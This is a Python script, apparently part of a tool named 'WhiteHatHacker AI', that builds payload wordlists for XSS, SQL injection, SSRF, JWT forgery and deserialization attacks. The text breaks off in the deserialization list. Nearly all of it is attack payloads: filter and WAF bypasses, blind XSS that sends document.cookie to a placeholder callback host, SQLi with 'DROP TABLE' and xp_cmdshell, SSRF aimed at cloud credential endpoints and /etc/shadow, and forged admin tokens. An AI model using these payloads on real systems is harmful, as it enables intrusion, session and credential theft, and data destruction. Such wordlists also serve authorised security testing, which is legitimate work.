#!/usr/bin/env python3
"""Generate expanded payload wordlists for WhiteHatHacker AI v3.0."""

import os

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PAYLOAD_DIR = os.path.join(BASE, "data", "wordlists", "payloads")


def generate_xss():
    """Generate comprehensive XSS payloads."""
    payloads = set()

    # Load existing
    xss_path = os.path.join(PAYLOAD_DIR, "xss.txt")
    if os.path.exists(xss_path):
        with open(xss_path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.add(line)

    # === BASIC ALERT VARIANTS ===
    for fn in ["alert", "confirm", "prompt"]:
        for arg in ["1", "document.domain", "document.cookie", "'XSS'", "location", "origin"]:
            payloads.add(f"<script>{fn}({arg})</script>")
        payloads.add(f"<script>{fn}`1`</script>")

    # === EVENT HANDLER EXPLOSION ===
    events = [
        "onload", "onerror", "onfocus", "onblur", "onclick", "ondblclick",
        "onmouseover", "onmouseout", "onmouseenter", "onmouseleave", "onmousemove",
        "onmousedown", "onmouseup", "onkeydown", "onkeypress", "onkeyup",
        "onchange", "oninput", "onsubmit", "onreset", "onselect", "onscroll",
        "onresize", "onwheel", "ondrag", "ondragstart", "ondragend", "ondragover",
        "ondragenter", "ondragleave", "ondrop", "oncontextmenu", "ontouchstart",
        "ontouchend", "ontouchmove", "ontouchcancel", "onpointerdown", "onpointerup",
        "onpointermove", "onpointerover", "onpointerout", "onpointerenter",
        "onpointerleave", "ongotpointercapture", "onlostpointercapture",
        "onanimationstart", "onanimationend", "onanimationiteration",
        "ontransitionend", "ontransitionstart", "ontransitionrun", "ontransitioncancel",
        "onbeforeinput", "onformdata", "onsecuritypolicyviolation",
        "onafterprint", "onbeforeprint", "onbeforeunload", "onhashchange",
        "onlanguagechange", "onmessage", "onmessageerror", "onoffline", "ononline",
        "onpagehide", "onpageshow", "onpopstate", "onstorage", "onunhandledrejection",
        "onrejectionhandled", "oncopy", "oncut", "onpaste", "onabort",
        "oncanplay", "oncanplaythrough", "ondurationchange", "onemptied", "onended",
        "onloadeddata", "onloadedmetadata", "onloadstart", "onpause", "onplay",
        "onplaying", "onprogress", "onratechange", "onseeked", "onseeking",
        "onstalled", "onsuspend", "ontimeupdate", "onvolumechange", "onwaiting",
        "ontoggle", "onshow", "oninvalid", "onsearch", "onslotchange",
    ]

    auto_fire = [
        ("img", "onerror", "src=x"), ("img", "onload", "src=valid"),
        ("body", "onload", ""), ("svg", "onload", ""),
        ("video", "onerror", "src=x"), ("audio", "onerror", "src=x"),
        ("input", "onfocus", "autofocus"), ("input", "onblur", "autofocus"),
        ("select", "onfocus", "autofocus"), ("textarea", "onfocus", "autofocus"),
        ("details", "ontoggle", "open"), ("marquee", "onstart", ""),
        ("object", "onerror", "data=x"), ("embed", "onerror", "src=x"),
        ("iframe", "onload", "src=about:blank"), ("math", "onload", ""),
        ("div", "onmouseover", ""), ("a", "onmouseover", "href=#"),
        ("button", "onfocus", "autofocus"), ("source", "onerror", ""),
    ]

    for tag, evt, attr in auto_fire:
        a = f" {attr}" if attr else ""
        for code in ["alert(1)", "alert(document.domain)", "confirm(1)"]:
            payloads.add(f"<{tag}{a} {evt}={code}>")
            payloads.add(f'<{tag}{a} {evt}="{code}">')

    for evt in events:
        payloads.add(f"<img src=x {evt}=alert(1)>")

    # === SVG / MATHML NAMESPACE ABUSE ===
    svg = [
        "<svg><script>alert(1)</script></svg>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        "<svg><animateTransform onbegin=alert(1) attributeName=x>",
        "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
        "<svg><a><rect width=100 height=100></rect><animate attributeName=href values=javascript:alert(1)></animate></a></svg>",
        "<svg><image href=x onerror=alert(1)></svg>",
        '<svg><animate xlink:href=#x attributeName=href values="javascript:alert(1)"></animate></svg>',
        "<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></use></svg>",
        '<svg><discard onbegin="alert(1)">',
    ]
    payloads.update(svg)

    mathml = [
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
        "<math><ms><img src=x onerror=alert(1)></math>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    ]
    payloads.update(mathml)

    # === mXSS (MUTATION XSS) ===
    mxss = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        "<listing><img src=1 onerror=alert(1)>",
        '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
        "<noembed><img src=x onerror=alert(1)></noembed>",
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<svg><math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<form><math><mtext><form><mglyph><style></math><img src=x onerror=alert(1)>",
        '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
        "<div id=x tabindex=0 onfocus=alert(1)><input id=x>",
        "<a id=x tabindex=0 onfocusin=alert(1)><input id=x>",
    ]
    payloads.update(mxss)

    # === DOMPurify BYPASS ===
    dompurify = [
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        '<svg><style>{font-family:"\\"}<img/src=x onerror=alert(1)//"}</style></svg>',
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
        "<svg><a><animate attributeName=href values=javascript:alert(1)></a><text>click</text></svg>",
        "<math><mi//xlink:href=\"javascript:alert(1)\">click</mi></math>",
    ]
    payloads.update(dompurify)

    # === CSP BYPASS ===
    csp = [
        '<script src="/api/jsonp?callback=alert(1)//"></script>',
        '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
        '{{constructor.constructor("alert(1)")()}}',
        '{{$eval.constructor("alert(1)")()}}',
        "<base href=//evil.com>",
        '<script src="data:text/javascript,alert(1)"></script>',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        "<script>import('data:text/javascript,alert(1)')</script>",
        '<link rel=prefetch href="javascript:alert(1)">',
    ]
    payloads.update(csp)

    # === FRAMEWORK SPECIFIC ===
    framework = [
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>',
        '{"__html": "<img src=x onerror=alert(1)>"}',
        '{{_c.constructor("alert(1)")()}}',
        '{{_openBlock.constructor("alert(1)")()}}',
        '<img src=x onerror="$.globalEval(\'alert(1)\')">',
        "${alert(1)}",
        "#{alert(1)}",
        "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
    ]
    payloads.update(framework)

    # === WAF BYPASS ===
    waf = [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img\tsrc=x\tonerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        "<img\rsrc=x\ronerror=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
        '<a href="j\\x0Aavascript:alert(1)">click</a>',
        "<img src=x onerror=top[/al/.source+/ert/.source](1)>",
        "<img src=x onerror=window[atob('YWxlcnQ=')](1)>",
        "<img src=x onerror=self[atob('YWxlcnQ=')](1)>",
        "<img src=x onerror=[1].find(alert)>",
        "<img src=x onerror=[1].map(alert)>",
        "<img src=x onerror=[1].some(alert)>",
        "<img src=x onerror=[1].every(alert)>",
        "<img src=x onerror=[1].filter(alert)>",
        "<img src=x onerror=[1].forEach(alert)>",
        "<img src=x onerror=Reflect.apply(alert,null,[1])>",
        '<img src=x onerror="void(alert(1))">',
        '<img src=x onerror="!alert(1)">',
        '<img src=x onerror="-alert(1)">',
        '<img src=x onerror="+alert(1)">',
        '<img src=x onerror="~alert(1)">',
        "<details/open/ontoggle=alert(1)>",
        "<svg/onload=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<img src=x onerror=alert(1)//>",
        # Backtick bypass
        "<img src=x onerror=alert`1`>",
        # Constructor access
        "<img src=x onerror=constructor.constructor('alert(1)')()>",
        # Fetch bypass for keywords
        "<img src=x onerror=window['\\x61lert'](1)>",
        "<img src=x onerror=globalThis['\\x61lert'](1)>",
    ]
    payloads.update(waf)

    # === ENCODING CHAINS ===
    encoding = [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        '<img src=x onerror="&#97;lert(1)">',
        '<img src=x onerror="al&#101;rt(1)">',
        '<img src=x onerror="\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29">',
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        '<a href="javascript:%61lert(1)">click</a>',
        '<a href="javascript:alert%281%29">click</a>',
        '<a href="jav&#x09;ascript:alert(1)">click</a>',
        '<a href="jav&#x0A;ascript:alert(1)">click</a>',
        '<a href="jav&#x0D;ascript:alert(1)">click</a>',
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    ]
    payloads.update(encoding)

    # === DOM XSS SINKS ===
    dom = [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:alert(document.cookie)",
        '#"><img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"onmouseover=alert(1)//"',
        "'onmouseover=alert(1)//'",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]
    payloads.update(dom)

    # === POLYGLOT PAYLOADS ===
    polyglots = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0telerik:0telerik%0D%0A/telerik/</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
        "'\"-->]]>*/</script></style></title></textarea><img src=x onerror=alert(1)>",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "'><svg onload=alert(1)>",
        '"autofocus onfocus=alert(1)//"',
        "'autofocus onfocus=alert(1)//'",
        "</script><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        '"><script>alert(1)</script><input value="',
        "{{7*7}}${7*7}<%= 7*7 %>",
    ]
    payloads.update(polyglots)

    # === CONTEXT-SPECIFIC BREAKOUT ===
    context = [
        '" onmouseover="alert(1)" "',
        '" onfocus="alert(1)" autofocus="',
        '" style="animation-name:x" onanimationstart="alert(1)" "',
        '"//onclick=alert(1)//',
        "' onmouseover='alert(1)' '",
        "' onfocus='alert(1)' autofocus='",
        "'-alert(1)-'",
        "\\'-alert(1)//",
        '";alert(1)//',
        '\\"};alert(1)//"',
        "</script><script>alert(1)</script>",
        "--><script>alert(1)</script><!--",
        '"}</script><script>alert(1)</script>',
        # Inside JSON
        '{"x":"<img src=x onerror=alert(1)>"}',
        "expression(alert(1))",
        "url(javascript:alert(1))",
    ]
    payloads.update(context)

    # === BLIND XSS ===
    blind = [
        '<img src=x onerror="fetch(\'https://INTERACTSH_URL/\'+document.cookie)">',
        '<img src=x onerror="new Image().src=\'https://INTERACTSH_URL/?c=\'+document.cookie">',
        "<script>fetch('https://INTERACTSH_URL/'+btoa(document.cookie))</script>",
        '<script>new Image().src="https://INTERACTSH_URL/?d="+document.domain+"&c="+document.cookie</script>',
        '"><script src=https://INTERACTSH_URL/xss.js></script>',
        "<svg onload=\"fetch('https://INTERACTSH_URL/?'+document.cookie)\">",
        "<input onfocus=\"fetch('https://INTERACTSH_URL/?'+document.cookie)\" autofocus>",
    ]
    payloads.update(blind)

    # === UNCOMMON TAGS ===
    uncommon = [
        "<form><button formaction=javascript:alert(1)>click</button></form>",
        "<form><input type=submit formaction=javascript:alert(1) value=click>",
        "<a href=javascript:alert(1)>click</a>",
        '<a href="javascript:void(0)" onclick=alert(1)>click</a>',
        '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
        "<portal src=javascript:alert(1)>",
        "<dialog open onclose=alert(1)></dialog>",
        "<slot name=x onfocus=alert(1) tabindex=0>click</slot>",
        "<xss style=pointer-events:none onmouseover=alert(1)>test</xss>",
        "<custom-element onmouseover=alert(1)>test</custom-element>",
        "<isindex type=image src=x onerror=alert(1)>",
    ]
    payloads.update(uncommon)

    # === PARENTHESIS-FREE ALERT ===
    paren_free = [
        "<img src=x onerror=alert`1`>",
        "<img src=x onerror=location='javascript:alert%281%29'>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        '<img src=x onerror=top["al"+"ert"](1)>',
        '<img src=x onerror=window["al"+"ert"](1)>',
        '<img src=x onerror=self["al"+"ert"](1)>',
        '<img src=x onerror=globalThis["al"+"ert"](1)>',
        "<img src=x onerror=import('data:text/javascript,alert(1)')>",
    ]
    payloads.update(paren_free)

    # === PROTOCOL HANDLERS ===
    protocols = [
        "javascript:alert(1)",
        "javascript:alert`1`",
        "javascript:/*-->*/alert(1)",
        "jaVascript:alert(1)",
        "JAVASCRIPT:alert(1)",
        "javascript&#58;alert(1)",
        "javascript&#x3A;alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "java\rscript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
    ]
    payloads.update(protocols)

    # === GENERATE ENCODED VARIANTS FOR TOP PAYLOADS ===
    base_payloads_for_encoding = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ]
    for bp in base_payloads_for_encoding:
        # Double URL encode
        payloads.add(bp.replace("<", "%253C").replace(">", "%253E"))
        # Unicode escape (for JS contexts)
        payloads.add(bp.replace("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074"))
        # HTML entity
        payloads.add(bp.replace("<", "&#60;").replace(">", "&#62;"))
        # Hex HTML entity
        payloads.add(bp.replace("<", "&#x3C;").replace(">", "&#x3E;"))

    # Write
    sorted_payloads = sorted(payloads)
    with open(xss_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — XSS Payload Wordlist (MEGA — v3.0)\n")
        f.write("# Categories: Reflected, Stored, DOM, mXSS, DOMPurify Bypass, CSP Bypass,\n")
        f.write("#   WAF Bypass (Cloudflare/Akamai/AWS/ModSec/Imperva/Sucuri), SVG/MathML,\n")
        f.write("#   Framework (Angular/React/Vue/jQuery), Polyglot, Encoding Chains,\n")
        f.write("#   Blind XSS, Context Breakout, Uncommon Tags, Filter Bypass, Protocols\n")
        f.write(f"# Total: {len(sorted_payloads)} unique payloads\n")
        f.write("# ============================================================================\n\n")
        for p in sorted_payloads:
            f.write(p + "\n")

    return len(sorted_payloads)


def generate_sqli():
    """Generate expanded SQLi payloads."""
    payloads = set()
    sqli_path = os.path.join(PAYLOAD_DIR, "sqli.txt")
    if os.path.exists(sqli_path):
        with open(sqli_path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.add(line)

    # === SECOND-ORDER SQLi ===
    second_order = [
        "admin'--", "admin'/*", "' OR '1'='1'--", "' OR '1'='1'/*",
        "admin' AND 1=1--", "admin' AND 1=2--",
        "test'; DROP TABLE users;--", "'; WAITFOR DELAY '0:0:5'--",
        "admin'||(SELECT 1 FROM dual)--", "admin'+(SELECT 1)+'",
    ]
    payloads.update(second_order)

    # === JSON/XML BODY INJECTION ===
    json_sqli = [
        '{"id": "1\' OR 1=1--"}',
        '{"id": "1 UNION SELECT 1,2,3--"}',
        '{"search": "test\' AND SLEEP(5)--"}',
        '{"user": {"$gt": ""}}',
        '{"user": {"$ne": null}}',
        '{"id": "1\' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"}',
    ]
    payloads.update(json_sqli)

    # === GRAPHQL ARGUMENT INJECTION ===
    graphql = [
        """{"query": "{ user(id: \\"1' OR 1=1--\\") { name } }"}""",
        """{"query": "mutation { login(user: \\"admin'--\\", pass: \\"x\\") { token } }"}""",
        """{"query": "{ users(filter: \\"' UNION SELECT 1--\\") { id } }"}""",
    ]
    payloads.update(graphql)

    # === WAF EVASION ===
    waf_sqli = [
        "1'/*!50000OR*/1=1--",
        "1'/**/OR/**/1=1--",
        "1' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "1'||1=1--",
        "1' AnD 1=1--",
        "1'%0aOR%0a1=1--",
        "1'%0bOR%0b1=1--",
        "1'%0cOR%0c1=1--",
        "1'%0dOR%0d1=1--",
        "1'%09OR%091=1--",
        "1'+UnIoN+SeLeCt+1,2,3--",
        "1'+un/**/ion+se/**/lect+1,2,3--",
        "1' UNION%23%0ASELECT 1,2,3--",
        "1' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--",
        "1' UNION ALL SELECT 1,CHAR(117,115,101,114,110,97,109,101),3--",
        "-1' UNION SELECT CONCAT(0x7e,version(),0x7e),2,3--",
    ]
    payloads.update(waf_sqli)

    # === DB-SPECIFIC ===
    # MySQL
    mysql = [
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "1' AND BENCHMARK(5000000,SHA1('test'))--",
    ]
    payloads.update(mysql)

    # PostgreSQL
    postgres = [
        "1'; SELECT PG_SLEEP(5)--",
        "1' AND 1=CAST((SELECT version()) AS int)--",
        "1'; COPY (SELECT version()) TO '/tmp/test'--",
        "1' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END)--",
        "1'||(SELECT string_agg(table_name,',') FROM information_schema.tables)--",
    ]
    payloads.update(postgres)

    # MSSQL
    mssql = [
        "1'; WAITFOR DELAY '0:0:5'--",
        "1'; EXEC xp_cmdshell('whoami')--",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "1'; DECLARE @q VARCHAR(200);SET @q='\\\\INTERACTSH_URL\\x';EXEC master..xp_dirtree @q--",
        "1' UNION SELECT NULL,@@version,NULL--",
    ]
    payloads.update(mssql)

    # Oracle
    oracle = [
        "1' AND 1=UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL')--",
        "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
        "1' UNION SELECT NULL,banner,NULL FROM v$version--",
        "1' AND 1=(SELECT COUNT(*) FROM all_tables)--",
    ]
    payloads.update(oracle)

    # === OOB DATA EXTRACTION ===
    oob = [
        "1'; EXEC master..xp_dirtree '\\\\INTERACTSH_URL\\x'--",
        "1' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.INTERACTSH_URL\\\\x'))--",
        "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.INTERACTSH_URL\\\\x')))--",
        "1'; DECLARE @q VARCHAR(200);SET @q=CONCAT('\\\\',@@version,'.INTERACTSH_URL\\x');EXEC master..xp_dirtree @q--",
    ]
    payloads.update(oob)

    # === BOOLEAN-BASED BLIND ===
    boolean = [
        "1' AND 1=1--", "1' AND 1=2--",
        "1' AND 'a'='a'--", "1' AND 'a'='b'--",
        "1' AND SUBSTRING(version(),1,1)='5'--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "1 AND 1=1", "1 AND 1=2",
        "1) AND 1=1--", "1) AND 1=2--",
        "1)) AND 1=1--", "1)) AND 1=2--",
    ]
    payloads.update(boolean)

    # === STACKED QUERIES ===
    stacked = [
        "1'; SELECT 1;--",
        "1'; INSERT INTO logs VALUES('test');--",
        "1'; UPDATE users SET role='admin' WHERE user='test';--",
    ]
    payloads.update(stacked)

    # Write
    sorted_payloads = sorted(payloads)
    with open(sqli_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — SQLi Payload Wordlist (v3.0)\n")
        f.write("# Categories: Classic, Boolean Blind, Time Blind, Error Based, UNION,\n")
        f.write("#   Stacked, Second-Order, JSON/GraphQL, DB-Specific (MySQL/PG/MSSQL/Oracle),\n")
        f.write("#   OOB Data Exfiltration, WAF Bypass\n")
        f.write(f"# Total: {len(sorted_payloads)} unique payloads\n")
        f.write("# ============================================================================\n\n")
        for p in sorted_payloads:
            f.write(p + "\n")

    return len(sorted_payloads)


def generate_ssrf():
    """Generate expanded SSRF payloads."""
    payloads = set()
    ssrf_path = os.path.join(PAYLOAD_DIR, "ssrf.txt")
    if os.path.exists(ssrf_path):
        with open(ssrf_path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.add(line)

    # === KUBERNETES / DOCKER ===
    k8s = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        "http://169.254.169.254/opc/v1/instance/",  # Oracle Cloud
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "http://kubernetes.default.svc/",
        "http://kubernetes.default.svc.cluster.local/",
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/secrets",
        "https://kubernetes.default.svc/api/v1/pods",
        "http://kubelet:10255/pods",
        "http://127.0.0.1:10255/pods",
        "http://127.0.0.1:10250/pods",
        "http://127.0.0.1:2375/containers/json",  # Docker socket
        "http://127.0.0.1:2375/images/json",
        "http://127.0.0.1:2376/containers/json",
        "unix:///var/run/docker.sock",
        "http://etcd:2379/v2/keys/",
    ]
    payloads.update(k8s)

    # === CLOUD INTERNAL SERVICES ===
    cloud = [
        # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.170.2/v2/credentials/",  # ECS task metadata
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ]
    payloads.update(cloud)

    # === DNS REBINDING ===
    dns_rebind = [
        "http://A.169.254.169.254.1time.INTERACTSH_URL/",
        "http://make-169.254.169.254-rebind.INTERACTSH_URL/",
        "http://0x7f000001.INTERACTSH_URL/",
    ]
    payloads.update(dns_rebind)

    # === URL PARSER DIFFERENTIAL ===
    parser_diff = [
        "http://127.0.0.1:80@evil.com/",
        "http://evil.com@127.0.0.1/",
        "http://127.0.0.1#@evil.com/",
        "http://127.0.0.1%2523@evil.com/",
        "http://127.0.0.1:80%40evil.com/",
        "http://0x7f000001/",
        "http://0177.0.0.1/",
        "http://2130706433/",  # Decimal IP
        "http://017700000001/",  # Octal IP
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://127.1/",
        "http://127.0.1/",
        "http://0/",
        "http://0.0.0.0/",
        "http://localhost/",
        "http://LOCALHOST/",
        "http://lOcAlHoSt/",
        "http://127。0。0。1/",  # Full-width dot
    ]
    payloads.update(parser_diff)

    # === SSRF VIA PROCESSORS ===
    via_processors = [
        # PDF generation SSRF
        "<iframe src='http://169.254.169.254/latest/meta-data/'></iframe>",
        "<img src='http://169.254.169.254/latest/meta-data/'>",
        "<link rel=stylesheet href='http://169.254.169.254/latest/meta-data/'>",
        "<object data='http://169.254.169.254/latest/meta-data/'>",
        # SVG SSRF
        '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>',
        # XXE-based SSRF
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ]
    payloads.update(via_processors)

    # === PROTOCOL SCHEMES ===
    protocols = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///proc/net/tcp",
        "file:///proc/net/fib_trie",
        "gopher://127.0.0.1:25/_EHLO%20localhost",
        "gopher://127.0.0.1:6379/_INFO%0D%0A",  # Redis
        "gopher://127.0.0.1:11211/_stats%0D%0A",  # Memcached
        "dict://127.0.0.1:6379/INFO",
        "ldap://127.0.0.1/",
        "tftp://127.0.0.1/test",
    ]
    payloads.update(protocols)

    # === REDIRECT-BASED SSRF ===
    redirect = [
        "http://INTERACTSH_URL/redirect?url=http://169.254.169.254/latest/meta-data/",
        "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
    ]
    payloads.update(redirect)

    sorted_payloads = sorted(payloads)
    with open(ssrf_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — SSRF Payload Wordlist (v3.0)\n")
        f.write("# Categories: Cloud Metadata (AWS/GCP/Azure/DO/Oracle/Alibaba), K8s/Docker,\n")
        f.write("#   DNS Rebinding, URL Parser Differential, SSRF via Processors,\n")
        f.write("#   Protocol Schemes (gopher/dict/file/ldap), Redirect-Based\n")
        f.write(f"# Total: {len(sorted_payloads)} unique payloads\n")
        f.write("# ============================================================================\n\n")
        for p in sorted_payloads:
            f.write(p + "\n")

    return len(sorted_payloads)


def generate_new_categories():
    """Generate new payload categories: JWT, deserialization, websocket, prototype pollution."""

    # === JWT PAYLOADS ===
    jwt_path = os.path.join(PAYLOAD_DIR, "jwt.txt")
    jwt = [
        # alg:none
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.',
        'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.',
        'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.',
        'eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.',
        # Algorithm confusion
        '{"alg":"HS256","typ":"JWT"}',  # RS256 -> HS256 confusion (sign with public key)
        # kid injection
        '{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}',
        '{"alg":"HS256","kid":"key\' UNION SELECT \'secret\'--","typ":"JWT"}',
        '{"alg":"HS256","kid":"/proc/sys/kernel/hostname","typ":"JWT"}',
        '{"alg":"HS256","kid":"http://INTERACTSH_URL/","typ":"JWT"}',
        # jku/x5u manipulation
        '{"alg":"RS256","jku":"http://INTERACTSH_URL/.well-known/jwks.json","typ":"JWT"}',
        '{"alg":"RS256","x5u":"http://INTERACTSH_URL/cert.pem","typ":"JWT"}',
        # Claim manipulation
        '{"sub":"admin","role":"admin","iss":"trusted-issuer"}',
        '{"sub":"admin","admin":true,"iss":"trusted-issuer"}',
        '{"sub":"admin","role":"superadmin","exp":9999999999}',
        # Expired token acceptance
        '{"sub":"test","exp":0}',
        '{"sub":"test","exp":1}',
        '{"sub":"test","nbf":9999999999}',
        # Signature stripping
        'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
    ]
    with open(jwt_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — JWT Manipulation Payloads (v3.0)\n")
        f.write("# Categories: alg:none, Algorithm Confusion, kid Injection,\n")
        f.write("#   jku/x5u Manipulation, Claim Tampering, Expiry Bypass\n")
        f.write(f"# Total: {len(jwt)} payloads\n")
        f.write("# ============================================================================\n\n")
        for p in jwt:
            f.write(p + "\n")

    # === DESERIALIZATION PAYLOADS ===
    deser_path = os.path.join(PAYLOAD_DIR, "deserialization.txt")
    deser = [
        # Java
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYWF1dGhvcml0eXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABGZpbGVxAH4AA0wABGhvc3RxAH4AA0wAA3JlZnEAfgADTAAIcHJvdG9jb2xxAH4AA3hw",
        "aced0005",  # Java serialized object magic bytes
